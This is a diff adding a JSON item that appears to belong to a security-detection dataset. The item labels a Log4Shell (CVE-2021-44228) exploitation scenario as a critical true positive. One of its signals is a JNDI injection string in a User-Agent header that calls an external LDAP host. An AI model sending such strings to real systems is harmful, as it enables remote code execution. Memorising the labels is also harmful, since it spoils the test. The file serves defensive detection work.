@@ -1,0 +1,20 @@
+{
+  "id": "log4shell-2021",
+  "source": "public: Apache Log4j CVE-2021-44228 (Log4Shell), Dec 2021",
+  "input": {
+    "description": "Outbound LDAP callback from an internet-facing Java app immediately after a crafted User-Agent containing ${jndi:ldap://...} hit the access log.",
+    "signals": [
+      "access log: User-Agent = ${jndi:ldap://45.155.x.x/a}",
+      "egress: JVM opened LDAP to external IP",
+      "app: log4j-core 2.14.1 on classpath"
+    ]
+  },
+  "labels": {
+    "intent_type": "detect",
+    "severity": "critical",
+    "is_true_positive": true,
+    "min_evidence_sources": 2,
+    "detection_deadline_minutes": 30,
+    "rationale_for_label": "Unauthenticated RCE, mass-exploited in the wild; the JNDI callback is a confirmed exploitation signal."
+  }
+}
